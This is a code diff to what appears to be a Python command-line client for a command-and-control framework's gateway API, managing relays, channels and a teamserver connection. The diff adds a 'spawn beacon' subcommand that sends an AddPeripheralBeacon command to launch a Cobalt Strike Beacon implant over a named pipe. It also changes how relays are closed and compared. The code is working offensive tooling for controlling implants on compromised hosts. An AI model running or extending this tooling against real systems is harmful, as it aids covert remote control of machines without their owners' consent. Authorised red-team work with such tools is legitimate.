@@ -939,7 +939,7 @@ def onAlarmRelay(args):
                     currLastTimestamp = relay['timestamp']
                     newestRelay = relay
 
-            if currLastTimestamp > lastTimestamp and len(currRelayIds) > len(origRelayIds) and newestRelay['agentId'] not in origRelayIds:
+            if currLastTimestamp > lastTimestamp and currRelayIds != origRelayIds:
                 lastTimestamp = currLastTimestamp
                 origRelayIds = currRelayIds
 
@@ -1006,7 +1006,7 @@ def findAgent(agentId):
 
 def getValueOrRandom(val, N = 6):
     if val == 'random':
-        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))
+        return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(N))
     
     return val
 
@@ -1042,7 +1042,23 @@ def closeRelay(gateway, relay):
     closeChannel(grcChannel, list(capability['channels'].keys())[list(capability['channels'].values()).index(grcChannel['type'])])
 
     print('\n[.] step 3: closing Relay itself')
-    closeRelay(gateway, relay)
+    data = {
+        "name" : "RelayCommandGroup",
+        "data" : {
+            "id" : commandsMap['Close'],
+            "name" : "Command",
+            "command" : "Close",
+            "arguments" : []
+        }
+    }
+
+    Logger.info(f'Closing Relay {relay["agentId"]} (id: {relay["agentId"]}). with following parameters:\n\n' + json.dumps(data, indent = 4))
+
+    ret = postRequest(f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/command', data, rawResp = True)
+    if ret.status_code == 201:
+        print(f'[+] Peripheral {relay["name"]} id:{relay["agentId"]} was closed.')
+    else:
+        print(f'[-] Peripheral {relay["name"]} id:{relay["agentId"]} was not closed: ({ret.status_code}) {ret.text}')
 
     print('\n[.] step 4: closing a channel being a neighbour for Relay\'s GRC')
     closed = False
@@ -1268,7 +1284,6 @@ def onLDAPCreate(args):
     Logger.info(f'Issuing a command with ID = {commandId}')
 
     data = {
-        "name" : "GatewayCommandGroup",
         "data" : {
             "arguments" : [
                 {
@@ -1348,7 +1363,6 @@ def onMSSQLCreate(args):
     Logger.info(f'Issuing a command with ID = {commandId}')
 
     data = {
-        "name" : "GatewayCommandGroup",
         "data" : {
             "arguments" : [
                 {
@@ -1403,6 +1417,53 @@ def onMSSQLCreate(args):
         print('[+] Channel was created.')
     else:
         print(f'[-] Channel was not created: ({ret.status_code}) {ret.text}')
+
+def onSpawnBeacon(args):
+    relays = collectRelays(args)
+    if len(relays) == 0:
+        logger.fatal('Could not find Relay to be used to spawn a Beacon.')
+
+    for gateway, relay in relays:
+        secondCommandId = getCommandIdMapping(gateway, 'AddPeripheralBeacon')
+        commandId = getLastGatewayCommandID()
+        Logger.info(f'Issuing a command with ID = {commandId}')
+
+        data = {
+            "name" : "RelayCommandGroup",
+            "data" : {
+                "arguments" : [
+                    {
+                        "type" : "string",
+                        "name" : "Pipe Name",
+                        "value" : getValueOrRandom(args.pipe_name),
+                    },
+                    {
+                        "type" : "int16",
+                        "name" : "Connection trials",
+                        "value" : args.trials,
+                    },
+                    {
+                        "type" : "int16",
+                        "name" : "Trials delay",
+                        "value" : args.delay
+                    }
+                ],
+                "command" : "AddPeripheralBeacon",
+                "id" : secondCommandId,
+                "name" : "Command",
+            },
+            'id' : commandId,
+        }
+
+        Logger.info('Will spawn Beacon with following parameters:\n\n' + json.dumps(data, indent = 4))
+    
+        print(f'[+] Spawning Beacon on relay: {relay["name"]} (id: {relay["agentId"]}) on gateway {gateway["name"]}')
+        ret = postRequest(f'/api/gateway/{gateway["agentId"]}/relay/{relay["agentId"]}/command', data, rawResp = True)
+
+        if ret.status_code == 201:
+            print('[+] Beacon was spawned.')
+        else:
+            print(f'[-] Beacon could not be spawned: ({ret.status_code}) {ret.text}')
 
 def onTurnOnTeamserver(args):
     gateways = getRequest(f'/api/gateway')
@@ -1607,6 +1668,21 @@ def parseArgs(argv):
     parser_ping.add_argument('-g', '--gateway-id', metavar='gateway_id', help = 'ID (or Name) of the Gateway which Relays should be pinged. If not given, will ping all relays in all gateways.')
     parser_ping.add_argument('-k', '--keep-pinging', metavar='delay', type=int, default=0, help = 'Keep pinging choosen Relays. Will send a ping every "delay" number of seconds. Default: sends ping only once.')
     parser_ping.set_defaults(func = onPing)
+
+    #
+    # Spawn
+    # 
+    parser_spawn = subparsers.add_parser('spawn', help = 'Spawn implant options')
+    parser_spawn_sub = parser_spawn.add_subparsers(help = 'What to spawn?', required = True)
+
+    ### Beacon
+    beacon = parser_spawn_sub.add_parser('beacon', help = 'Spawn new Cobalt Strike Beacon.')
+    beacon.add_argument('relay_id', metavar = 'relay_id', help = 'Relay in which to spawn Beacon. Can be ID or Name.')
+    beacon.add_argument('--pipe-name', metavar = 'pipe_name', default='random', help = 'Beacon Pipe name. Default: random')
+    beacon.add_argument('--trials', metavar = 'trials', type=int, default=10, help = 'Beacon connection trials. Default: 10')
+    beacon.add_argument('--delay', metavar = 'delay', type=int, default=1000, help = 'Beacon connection delay. Default: 1000')
+    beacon.add_argument('-g', '--gateway-id', metavar='gateway_id', help = 'ID (or Name) of the Gateway runs specified Relay. If not given, will return all relays matching criteria from all gateways.')
+    beacon.set_defaults(func = onSpawnBeacon)
 
     #
     # Connector
